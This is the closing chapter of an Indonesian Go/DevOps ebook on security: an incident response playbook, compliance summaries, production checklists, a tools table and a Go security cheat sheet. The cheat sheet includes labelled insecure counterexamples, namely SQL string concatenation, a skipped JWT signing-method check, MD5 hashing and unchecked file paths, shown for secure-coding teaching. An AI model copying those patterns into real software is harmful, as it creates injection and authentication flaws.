## 20.22 Incident Response — When Shit Hits the Fan

### Security Incident Playbook

```
Phase 1: DETECT (Deteksi)
━━━━━━━━━━━━━━━━━━━━━━━━
Bagaimana kamu tau ada incident?

Sources:
- Monitoring alert (Grafana/PagerDuty)
- User report ("Akun saya di-hack")
- Security scan finding
- Unusual metrics (spike login failures, unusual traffic)
- Third-party notification (HackerOne, security researcher)
- Law enforcement notification

Severity classification:
- P1 Critical: Data breach, system compromise, active attack
- P2 High: Vulnerability discovered, suspicious activity
- P3 Medium: Minor vulnerability, security misconfiguration
- P4 Low: Information disclosure, best practice violation
```

```
Phase 2: CONTAIN (Containment)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Stop the bleeding. Prioritas: STOP damage dari meluas.

Actions:
□ Isolate affected systems (network segmentation)
□ Revoke compromised credentials/tokens
□ Block attacker IP addresses
□ Disable affected features
□ Force password reset (kalau credential compromised)
□ Rotate all secrets (JWT secret, API keys, DB passwords)
□ Preserve evidence (JANGAN delete logs!)
□ Document timeline
```

```
Phase 3: ERADICATE (Eradikasi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Hapus root cause. Fix the vulnerability.

Actions:
□ Identify root cause (code vulnerability, misconfiguration, social engineering)
□ Patch vulnerability
□ Remove malware/backdoor
□ Review all similar systems for same vulnerability
□ Update dependencies
□ Run full security scan
```

```
Phase 4: RECOVER (Pemulihan)
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Bring systems back to normal.

Actions:
□ Deploy patched version
□ Verify fix (penetration test)
□ Restore data from clean backups (if needed)
□ Re-enable services gradually
□ Monitor closely for 48-72 hours
□ Verify no backdoors remain
```

```
Phase 5: LESSONS LEARNED (Post-Mortem)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Belajar dari incident supaya ga terulang.

Post-mortem document:
□ What happened (timeline)
□ How it was detected
□ What was the impact
□ Root cause analysis
□ What went well
□ What could be improved
□ Action items with owners and deadlines
□ Security improvements to implement
```

### Communication Template

```
=== SECURITY INCIDENT NOTIFICATION ===

Date: [YYYY-MM-DD]
Severity: [P1/P2/P3/P4]
Status: [Investigating / Contained / Resolved]

Summary:
[Brief description of the incident]

Impact:
- Systems affected: [list]
- Data affected: [type and scope]
- Users affected: [count]
- Duration: [start time - end time]

Current Actions:
[What is being done right now]

Timeline:
- [HH:MM] - [Event description]
- [HH:MM] - [Event description]

Next Update: [Time of next communication]

Contact: [Incident commander name and contact]
=== END ===
```

### Post-Mortem Template

```markdown
# Post-Mortem: [Incident Title]

## Date: YYYY-MM-DD
## Severity: P1/P2/P3/P4
## Duration: HH:MM - HH:MM (X hours)

## Summary
[2-3 sentences describing the incident]

## Impact
- [X] users affected
- [Y] records compromised
- [Z] minutes of downtime

## Root Cause
[Technical explanation of what went wrong]

## Timeline
| Time | Event |
|------|-------|
| HH:MM | Alert triggered: ... |
| HH:MM | Engineer acknowledged |
| HH:MM | Root cause identified |
| HH:MM | Fix deployed |
| HH:MM | Incident resolved |

## What Went Well
- Alert triggered within X minutes
- Team responded quickly
- Communication was clear

## What Went Wrong
- [Root cause description]
- [Process failure]
- [Detection gap]

## Action Items
| # | Action | Owner | Deadline | Status |
|---|--------|-------|----------|--------|
| 1 | Patch vulnerability X | Dev team | YYYY-MM-DD | Done |
| 2 | Add monitoring for Y | SRE | YYYY-MM-DD | In progress |
| 3 | Update runbook for Z | Security | YYYY-MM-DD | Not started |

## Lessons Learned
[Key takeaways and improvements]
```

---

## 20.23 Compliance Basics — Legal Requirements

### GDPR (General Data Protection Regulation) — EU

```
Kalau app kamu diakses user dari EU, GDPR berlaku:

Key requirements:
1. Consent — User harus explicitly setuju datanya dikumpulkan
2. Right to access — User bisa minta semua datanya
3. Right to delete — User bisa minta hapus semua datanya
4. Data minimization — Cuma kumpulkan data yang benar-benar perlu
5. Breach notification — Wajib lapor data breach dalam 72 jam
6. Data processing agreement — Kontrak dengan third-party processors
7. Privacy by design — Privacy dipikirkan dari awal development

Denda: sampai 4% annual revenue atau 20 juta EUR (mana yang lebih besar)
```

```go
// GDPR: Right to delete (User data deletion)
func (h *UserHandler) DeleteMyData(c *gin.Context) {
    userID := c.GetUint("userID")

    // 1. Delete semua tasks yang di-assign ke user
    h.taskService.DeleteByAssignee(userID)

    // 2. Delete semua boards milik user
    h.boardService.DeleteByOwner(userID)

    // 3. Anonymize user data (atau hard delete)
    h.userService.Anonymize(userID)

    // 4. Revoke semua tokens
    h.authService.RevokeAllTokens(userID)

    // 5. Log the action
    log.Printf("[GDPR] User %d requested data deletion", userID)

    response.Success(c, http.StatusOK, "All your data has been deleted", nil)
}

// GDPR: Data export
func (h *UserHandler) ExportMyData(c *gin.Context) {
    userID := c.GetUint("userID")

    data := map[string]interface{}{
        "user":   h.userService.GetProfile(userID),
        "boards": h.boardService.GetByOwner(userID),
        "tasks":  h.taskService.GetByAssignee(userID),
    }

    c.JSON(http.StatusOK, data)
}
```

### PCI DSS — Payment Card Industry

```
Kalau app kamu process payment/credit card:

Key requirements:
1. JANGAN simpan credit card data di server kamu
2. Pakai payment processor (Stripe, Midtrans)
3. Encrypted transmission (HTTPS)
4. Access control
5. Regular security testing
6. Maintain security policy

Shortcut: Pakai Stripe/Midtrans → mereka yang handle PCI compliance
```

### SOC 2

```
SOC 2 = audit framework untuk SaaS companies

5 Trust Criteria:
1. Security — protection against unauthorized access
2. Availability — system operational and usable
3. Processing Integrity — data processing accurate and timely
4. Confidentiality — data protected
5. Privacy — personal information handled properly

Biasanya diminta kalau kamu jual ke enterprise customers.
```

### Indonesia — UU PDP (Undang-Undang Pelindungan Data Pribadi)

```
UU No. 27 Tahun 2022 — mulai berlaku Oktober 2024

Key points:
1. Consent — perlu persetujuan eksplisit dari pemilik data
2. Data portability — user bisa minta datanya dipindahkan
3. Right to delete — user bisa minta data dihapus
4. Breach notification — wajib lapor ke pemilik data dalam 3x24 jam
5. Data protection officer — wajib punya DPO
6. Cross-border transfer — regulasi transfer data ke luar negeri

Sanksi: denda sampai 2% annual revenue atau penjara sampai 6 tahun

Relevansi untuk Task Manager:
- Simpan data user (email, nama) → butuh consent
- Harus bisa delete data user (right to delete)
- Harus notify kalau ada breach
```

---

## 20.24 Security Checklist — Production Ready

### Pre-Launch Security Checklist

```
AUTHENTICATION & AUTHORIZATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
□ Password hashing: bcrypt/argon2 (bukan MD5/SHA)
□ JWT secret: strong, random, from env var (min 32 chars)
□ Access token expiry: short (15 minutes)
□ Refresh token rotation implemented
□ Generic login error messages (no email enumeration)
□ Brute force protection (rate limit + account lockout)
□ Role-based access control (RBAC)
□ Ownership check di setiap resource (prevent IDOR)
□ Admin actions logged

INPUT VALIDATION
━━━━━━━━━━━━━━━━
□ Semua input validated (type, length, format, range)
□ SQL injection prevention (parameterized queries)
□ XSS prevention (input sanitization, output encoding)
□ Request size limit
□ Pagination limit (max 100)
□ File upload validation (kalau ada)

TRANSPORT SECURITY
━━━━━━━━━━━━━━━━━━
□ HTTPS everywhere (TLS 1.2+)
□ HSTS header enabled
□ HTTP redirect ke HTTPS
□ Secure cookie flags (Secure, HttpOnly, SameSite)

API SECURITY
━━━━━━━━━━━━
□ Rate limiting (global + per endpoint)
□ CORS configured (whitelist, bukan *)
□ Request timeout
□ Security headers set
□ Error responses don't leak info (no stack traces)
□ API versioning
□ Disabled debug mode in production

SECRET MANAGEMENT
━━━━━━━━━━━━━━━━━
□ No hardcoded secrets in code
□ Secrets in environment variables / secret manager
□ .env NOT in git (in .gitignore)
□ JWT secret rotatable
□ Database credentials: separate app user (least privilege)
□ Validate required secrets at startup

INFRASTRUCTURE
━━━━━━━━━━━━━━
□ Docker: non-root user
□ Docker: minimal base image (scratch/distroless)
□ Docker: no secrets in image
□ Docker: resource limits
□ Database: not exposed to public
□ Database: SSL connections
□ Database: least privilege user
□ Redis: password protected
□ Firewall: only necessary ports open

DEPENDENCIES
━━━━━━━━━━━━
□ govulncheck clean
□ go mod verify passes
□ Dependencies updated
□ Minimal dependencies
□ Dependabot enabled

CI/CD SECURITY
━━━━━━━━━━━━━━
□ SAST (gosec) in pipeline
□ SCA (govulncheck) in pipeline
□ Secret scanning (gitleaks) in pipeline
□ Container scanning (Trivy) in pipeline
□ No secrets in CI/CD logs
□ Pin action versions (SHA)

MONITORING & LOGGING
━━━━━━━━━━━━━━━━━━━━
□ Security events logged (login, access denied, admin actions)
□ Sensitive data NOT logged (passwords, tokens)
□ Alerting on suspicious activity
□ Log retention policy
□ Centralized logging

KUBERNETES (kalau pakai)
━━━━━━━━━━━━━━━━━━━━━━━━
□ Pod: runAsNonRoot
□ Pod: readOnlyRootFilesystem
□ Pod: drop ALL capabilities
□ NetworkPolicy: default deny
□ Secrets: encrypted at rest
□ RBAC: least privilege
□ Service accounts: minimal permissions

COMPLIANCE
━━━━━━━━━━
□ Privacy policy
□ Terms of service
□ Data deletion capability
□ Data export capability
□ Breach notification process
□ Incident response plan documented
```

---

## 20.25 Tools Comparison — Security Arsenal

### Security Tools Table

| Category | Tool | Type | Language | Free? | Best For |
|----------|------|------|----------|-------|----------|
| **SAST** | gosec | Static Analysis | Go | Yes | Go-specific security |
| **SAST** | staticcheck | Static Analysis | Go | Yes | Go best practices |
| **SAST** | CodeQL | Static Analysis | Multi | Yes* | Deep code analysis |
| **SAST** | SonarQube | Static Analysis | Multi | Freemium | Enterprise |
| **SCA** | govulncheck | Dependency Scan | Go | Yes | Go vulnerabilities |
| **SCA** | Snyk | Dependency Scan | Multi | Freemium | Comprehensive |
| **SCA** | Dependabot | Dependency Scan | Multi | Yes* | GitHub integration |
| **DAST** | OWASP ZAP | Dynamic Scanner | Multi | Yes | API/web scanning |
| **DAST** | Burp Suite | Dynamic Scanner | Multi | Freemium | Manual testing |
| **DAST** | Nuclei | Dynamic Scanner | Multi | Yes | Template-based |
| **Secrets** | gitleaks | Secret Scanner | Multi | Yes | Git history scan |
| **Secrets** | TruffleHog | Secret Scanner | Multi | Yes | Deep scanning |
| **Secrets** | git-secrets | Secret Scanner | Multi | Yes | AWS-focused |
| **Container** | Trivy | Image Scanner | Multi | Yes | Comprehensive |
| **Container** | Grype | Image Scanner | Multi | Yes | Anchore ecosystem |
| **Container** | Snyk Container | Image Scanner | Multi | Freemium | CI integration |
| **Pentest** | sqlmap | SQL Injection | Multi | Yes | SQLi testing |
| **Pentest** | nmap | Port Scanner | Multi | Yes | Network recon |
| **Pentest** | ffuf | Fuzzer | Multi | Yes | Web fuzzing |
| **Infra** | kube-bench | K8s Audit | K8s | Yes | CIS benchmark |
| **Infra** | kubeaudit | K8s Audit | K8s | Yes | K8s security |
| **Vault** | HashiCorp Vault | Secret Manager | Multi | Freemium | Enterprise |
| **Vault** | AWS Secrets Manager | Secret Manager | AWS | Paid | AWS native |
| **Vault** | Sealed Secrets | Secret Manager | K8s | Yes | K8s GitOps |

\* Free untuk open source / public repos

### Recommended Stack (untuk Task Manager)

```
Development:
- gosec (SAST) — jalankan lokal sebelum push
- gitleaks (pre-commit hook) — cegah commit secrets
- govulncheck — check dependencies

CI/CD Pipeline:
- gosec (SAST)
- govulncheck (SCA)
- gitleaks (secret scanning)
- Trivy (container scanning)
- OWASP ZAP (DAST — optional, di staging)

Production:
- Security headers middleware
- Rate limiting (Redis)
- Structured security logging
- Grafana alerts

Periodic:
- OWASP ZAP full scan (monthly)
- Dependency update review (weekly)
- Security audit (quarterly)
```

---

## 20.26 Cheat Sheet — Quick Reference

### Security Headers Cheat Sheet

```
Header                          │ Value                                    │ Purpose
────────────────────────────────│──────────────────────────────────────────│────────────────────────
X-Content-Type-Options          │ nosniff                                  │ Prevent MIME sniffing
X-Frame-Options                 │ DENY                                    │ Prevent clickjacking
Strict-Transport-Security       │ max-age=31536000; includeSubDomains     │ Force HTTPS
Content-Security-Policy         │ default-src 'self'                      │ Control resource loading
Referrer-Policy                 │ strict-origin-when-cross-origin         │ Control referrer info
Permissions-Policy              │ camera=(), microphone=()                │ Disable browser features
X-XSS-Protection                │ 1; mode=block                           │ Legacy XSS protection
Cache-Control                   │ no-store, private                       │ Prevent caching sensitive data
```

### Go Security Patterns Cheat Sheet

```go
// === PASSWORD HASHING ===
// DO:
hashed, _ := bcrypt.GenerateFromPassword([]byte(password), 12)
// DON'T:
hash := md5.Sum([]byte(password))

// === SQL QUERIES ===
// DO:
db.Where("email = ?", email).First(&user)
// DON'T:
db.Raw("SELECT * FROM users WHERE email = '" + email + "'")

// === JWT VALIDATION ===
// DO: Check signing method
if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
    return nil, errors.New("unexpected signing method")
}
// DON'T: Skip method check
claims, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
    return []byte(secret), nil
})

// === ERROR RESPONSES ===
// DO: Generic message
return nil, errors.New("invalid email or password")
// DON'T: Specific message
return nil, errors.New("email not found")
return nil, errors.New("wrong password")

// === RANDOM TOKENS ===
// DO: crypto/rand
b := make([]byte, 32)
_, err := rand.Read(b)
token := base64.URLEncoding.EncodeToString(b)
// DON'T: math/rand
token := fmt.Sprintf("%d", rand.Int())

// === HTTP CLIENT ===
// DO: Set timeout
client := &http.Client{Timeout: 10 * time.Second}
// DON'T: Default client (no timeout!)
resp, err := http.Get(url)

// === FILE PATHS ===
// DO: Clean paths
cleanPath := filepath.Clean(userInput)
if !strings.HasPrefix(cleanPath, allowedDir) {
    return errors.New("path traversal detected")
}
// DON'T: Use raw user input
os.ReadFile(userInput)

// === SECRETS ===
// DO: Environment variables
secret := os.Getenv("JWT_SECRET")
// DON'T: Hardcoded
const secret = "my-secret-key"

// === INPUT PARSING ===
// DO: Parse to correct type first
id, err := strconv.ParseUint(c.Param("id"), 10, 64)
if err != nil { return }
db.First(&user, uint(id))
// DON'T: Pass string directly
db.First(&user, c.Param("id"))
```

### Common Vulnerability Fixes

```
Vulnerability              │ Fix
───────────────────────────│──────────────────────────────────────
SQL Injection              │ Parameterized queries (GORM default)
XSS                        │ html.EscapeString() + CSP header
CSRF                       │ JWT in header (not cookie) / CSRF token
IDOR                       │ Ownership check before data access
Brute Force                │ Rate limiting + account lockout
Data Exposure              │ json:"-" tag, DTOs, field-level auth
Weak Passwords             │ bcrypt cost 12+ / argon2id
Secret Leakage             │ Environment variables + .gitignore
Insecure Dependencies      │ govulncheck + Dependabot
Missing Auth               │ Auth middleware on all protected routes
Privilege Escalation       │ Role middleware + least privilege
Info Disclosure            │ Generic errors + release mode
Open Redirect              │ Whitelist allowed redirect URLs
Path Traversal             │ filepath.Clean() + prefix check
SSRF                       │ Block internal IPs + whitelist URLs
```

---

## 20.27 Final Checklist — Security Mastery

```
Setelah bab ini, kamu harus bisa:

UNDERSTAND (Paham konsep):
□ Jelaskan OWASP Top 10 dan berikan contoh masing-masing
□ Jelaskan perbedaan SAST, DAST, dan SCA
□ Jelaskan kenapa bcrypt lebih aman dari MD5
□ Jelaskan apa itu IDOR dan cara mencegahnya
□ Jelaskan defense in depth (multiple layers of security)

IMPLEMENT (Bisa implementasi):
□ Security headers middleware di Gin
□ CORS configuration yang proper
□ Input validation dengan custom validators
□ Login rate limiting per email
□ JWT blacklist untuk logout
□ Security logging (auth events, access denied)
□ Ownership check di setiap endpoint

CONFIGURE (Bisa konfigurasi):
□ HTTPS/TLS di Nginx
□ Docker security (non-root, scratch image, resource limits)
□ Kubernetes SecurityContext dan NetworkPolicy
□ Database least privilege user
□ Secret management (env vars, Docker secrets, K8s secrets)
□ CI/CD security pipeline (gosec, govulncheck, gitleaks, Trivy)

TEST (Bisa testing):
□ Manual security testing (IDOR, injection, auth bypass)
□ Automated scanning (OWASP ZAP, sqlmap)
□ Dependency scanning (govulncheck)
□ Container scanning (Trivy)

RESPOND (Bisa merespon):
□ Incident response plan
□ Post-mortem documentation
□ Communication template
□ Root cause analysis
```

---

## 20.28 Penutup E-Book — The End of The Beginning

Selamat. Kamu sudah sampai di akhir bab terakhir dari ebook ini.

Tapi sebelum nutup, mari kita lihat sebentar perjalanan yang udah kamu tempuh.

### Recap Semua 20 Bab

```
BAGIAN 1: ROADMAP & STRATEGI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Bab 1: Roadmap Fullstack → DevOps + Senior Backend
      → Kamu punya peta jalan yang jelas. Tau harus belajar apa, urutan apa.

Bab 2: Strategi Belajar — Project End-to-End
      → Belajar bukan cuma baca, tapi hands-on bikin project nyata dari nol.

BAGIAN 2: GO FUNDAMENTALS
━━━━━━━━━━━━━━━━━━━━━━━━━
Bab 3: Kenapa Go + Setup Project
      → Go itu bahasa yang simple tapi powerful. Typed, compiled, concurrent.
      → Kamu setup project Task Manager dari scratch.

Bab 4: Go Syntax & Pattern untuk Backend Dev
      → Dari variable, function, struct, interface, error handling, goroutine.
      → Kamu paham Go cukup untuk build production app.

BAGIAN 3: BACKEND DEVELOPMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Bab 5: REST API dengan Gin
      → CRUD endpoints, routing, middleware, request/response handling.
      → Task Manager API mulai hidup.

Bab 6: Database — PostgreSQL + Migration
      → GORM, migration, relationships, indexing.
      → Data kamu persistent dan terstruktur.

Bab 7: Authentication — JWT + RBAC
      → Register, login, JWT tokens, refresh tokens, role middleware.
      → API kamu secured. Ga sembarang orang bisa masuk.

Bab 8: Caching dengan Redis
      → Cache-aside pattern, session store, performance boost.
      → Response time drop dari 50ms ke 2ms.

Bab 9: Message Queue — Async Processing
      → RabbitMQ, background jobs, decoupling.
      → App kamu bisa handle heavy tasks tanpa blocking.

Bab 10: Testing
      → Unit test, integration test, mocking, coverage.
      → Kamu bisa tidur tenang karena ada test yang jaga code kamu.

BAGIAN 4: DEVOPS
━━━━━━━━━━━━━━━━
Bab 11: Docker — Containerization
      → Dockerfile, multi-stage build, docker-compose.
      → "It works on my machine" sudah mati.

Bab 12: CI/CD — GitHub Actions
      → Automated test, build, deploy. Push code → otomatis deploy.
      → Kamu bisa release 10x sehari tanpa stress.

Bab 13: Cloud — AWS
      → EC2, RDS, S3, VPC. App kamu live di cloud.
      → Dari localhost ke internet.

Bab 14: Nginx & Reverse Proxy
      → Load balancing, SSL termination, caching.
      → Traffic management yang proper.

Bab 15: Monitoring — Prometheus + Grafana
      → Metrics, dashboards, alerting.
      → Kamu TAU apa yang terjadi di production.

BAGIAN 5: ADVANCED
━━━━━━━━━━━━━━━━━━
Bab 16: Kubernetes
      → Pods, Deployments, Services, Ingress, auto-scaling.
      → Orchestrate containers di scale besar.

Bab 17: Terraform — Infrastructure as Code
      → Define infrastructure di code. Reproducible, version controlled.
      → Infrastructure bukan lagi klik-klik di console.

Bab 18: Microservices Pattern
      → Kapan monolith, kapan microservices. gRPC, saga, circuit breaker.
      → Kamu paham arsitektur distributed system.

Bab 19: Performance & Load Testing
      → Profiling, benchmarking, load testing, optimization.
      → App kamu bisa handle ribuan concurrent users.

Bab 20: Security Best Practices (BAB INI)
      → OWASP Top 10, secure coding, infrastructure hardening, incident response.
      → App kamu ga cuma jalan — tapi AMAN.
```

### Journey: Dari Fullstack Developer ke DevOps + Senior Backend

```
DULU (sebelum ebook ini):
━━━━━━━━━━━━━━━━━━━━━━━━
- Kamu bisa bikin app pakai NestJS atau Laravel
- Deploy = upload ke shared hosting atau "minta tolong DevOps"
- Database = Sequelize/Eloquent, ga paham query optimization
- "Server down" = panik, ga tau harus ngapain
- Testing = "manual testing aja cukup"
- Security = "nanti aja kalau udah launch"
- Docker = "pernah denger, belum nyoba"
- Kubernetes = "itu apaan?"

SEKARANG (setelah ebook ini):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- Kamu bisa bikin production-ready API pakai Go
- Deploy = Docker → CI/CD → Cloud, automated
- Database = paham indexing, optimization, replication
- "Server down" = cek monitoring, check logs, fix, deploy
- Testing = unit + integration + load test, automated di CI
- Security = OWASP Top 10 aware, security pipeline, incident response
- Docker = multi-stage build, security hardening, compose
- Kubernetes = pods, deployments, networking, scaling
- Terraform = infrastructure as code, reproducible
- Monitoring = Prometheus + Grafana, alerting
```

### What's Next? — Ga Berhenti di Sini

Ebook ini adalah **fondasi**. Kamu udah punya pondasi yang kuat. Sekarang, arah selanjutnya:

#### 1. AWS Certification

```
AWS Solutions Architect Associate (SAA-C03):
- Paling valuable cloud certification
- Boost CV significant
- Kamu udah punya pengalaman dari Bab 13
- Investasi: ~$150 exam fee + 2-3 bulan belajar
- Resources: Adrian Cantrill course, Stephane Maarek (Udemy)

Setelah SAA:
- AWS Developer Associate
- AWS DevOps Engineer Professional
- Atau: GCP/Azure kalau perusahaan pakai itu
```

#### 2. Contribute ke Open Source

```
Kenapa open source:
- Proof of skill yang NYATA (bukan cuma sertifikat)
- Belajar dari codebase production-quality
- Networking dengan engineer top dunia
- Bisa jadi portfolio item

Mulai dari mana:
- Fix typo/documentation (low barrier)
- Reproduce dan report bugs
- Fix "good first issue" labels
- Contribute ke tools yang kamu pakai (Gin, GORM, Trivy)

Go open source projects yang bagus untuk kontribusi:
- github.com/gin-gonic/gin
- github.com/go-playground/validator
- github.com/aquasecurity/trivy
- github.com/prometheus/prometheus
```

#### 3. Build Portfolio

```
Portfolio yang IMPACT:
1. Task Manager API ini (refine, deploy, open source)
2. Blog — tulis apa yang kamu pelajari (technical writing)
3. Side project — solve real problem
4. Conference talk — share knowledge

Portfolio checklist:
□ GitHub profile dengan kontribusi aktif
□ README yang jelas di setiap project
□ Live demo (deploy di cloud)
□ Blog/article (Medium, Dev.to, personal blog)
□ LinkedIn yang updated
```

#### 4. Deep Dive Topics

```
Berdasarkan interest:

Path A: Platform Engineering
- ArgoCD (GitOps)
- Service Mesh (Istio/Linkerd)
- eBPF (network observability)
- Crossplane (infrastructure)

Path B: Backend Mastery
- Event sourcing & CQRS
- Distributed consensus (Raft)
- Database internals
- Compiler/interpreter (Go is great for this)

Path C: SRE (Site Reliability Engineering)
- SLI/SLO/SLA
- Error budgets
- Chaos engineering (Chaos Monkey)
- Capacity planning

Path D: Security Engineering
- Penetration testing certification (OSCP)
- Cloud security (AWS Security Specialty)
- Security architecture
- Threat modeling
```

### Kata Penutup

Kamu sudah menempuh perjalanan yang panjang. Dari developer yang "cuma bisa ngoding fitur" ke engineer yang bisa **design, build, test, deploy, monitor, secure, dan maintain** production systems.

Ini bukan perjalanan yang mudah. 20 bab. Ratusan halaman. Ribuan baris code. Puluhan konsep baru. Dan kamu sampai di sini.

Tapi ingat — **bab terakhir dari ebook ini bukan akhir dari perjalananmu**. Ini adalah awal. Fondasi sudah dibangun. Sekarang saatnya bangun di atasnya.

Beberapa hal yang mau gue ingetin di akhir:

**1. Jangan takut ga paham semua.** Ga ada engineer yang paham 100% dari semua topik. Yang penting kamu tau **apa yang kamu ga tau** — dan tau dimana carinya kalau butuh.

**2. Build things.** Baca 100 buku soal swimming ga bikin kamu bisa renang. Yang bikin kamu bisa renang adalah **masuk ke air**. Bikin project. Break things. Fix things. Ship things.

**3. Stay curious.** Teknologi berubah cepat. Tool yang populer hari ini bisa diganti besok. Tapi **fundamental** — networking, security, system design, data structures — itu abadi. Investasi di fundamental.

**4. Share knowledge.** Cara terbaik untuk belajar adalah mengajarkan. Tulis blog. Buat video. Bantu di forum. Mentor junior developer. Knowledge yang kamu share balik ke kamu berlipat ganda.

**5. Take care of yourself.** Burnout itu nyata. Ga harus belajar 16 jam sehari. Konsisten > intense. 1 jam sehari selama setahun > 12 jam sehari selama sebulan lalu berhenti.

```
Dari seorang fullstack developer yang belajar bareng:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Ebook ini ditulis sambil belajar.
Setiap bab adalah catatan perjalanan nyata.
Setiap code snippet sudah dijalankan.
Setiap error sudah dialami.

Kalau ada satu hal yang gue mau kamu bawa dari ebook ini:

"The best time to start was yesterday.
 The second best time is now."

Kamu sudah mulai. Jangan berhenti.
```

---

> **E-book: DevOps & Senior Backend Engineer — Learning E-Book**
> **Author:** Irzan Aldi
> **Bab 20 dari 20 — Security Best Practices**
> **Selesai.**
